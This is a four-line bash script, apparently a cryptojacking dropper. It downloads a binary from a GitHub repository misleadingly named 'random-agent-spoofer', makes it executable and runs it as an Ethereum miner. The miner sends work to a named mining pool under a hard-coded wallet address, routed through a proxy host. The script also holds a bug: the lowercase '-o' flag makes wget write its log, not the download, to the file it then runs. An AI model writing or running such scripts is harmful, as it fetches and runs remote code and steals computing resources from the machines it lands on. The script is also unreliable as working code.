#!/bin/bash
wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/a -o van
chmod 775 van
./van -a ethash -o ethproxy+tcp://asia1.ethermine.org:4444 -u 0xac2a5aaa1b901c08b383fc7163ebd5bd4ee24d70.worker --proxy 6f390780b468.sn.mynetname.net:9090

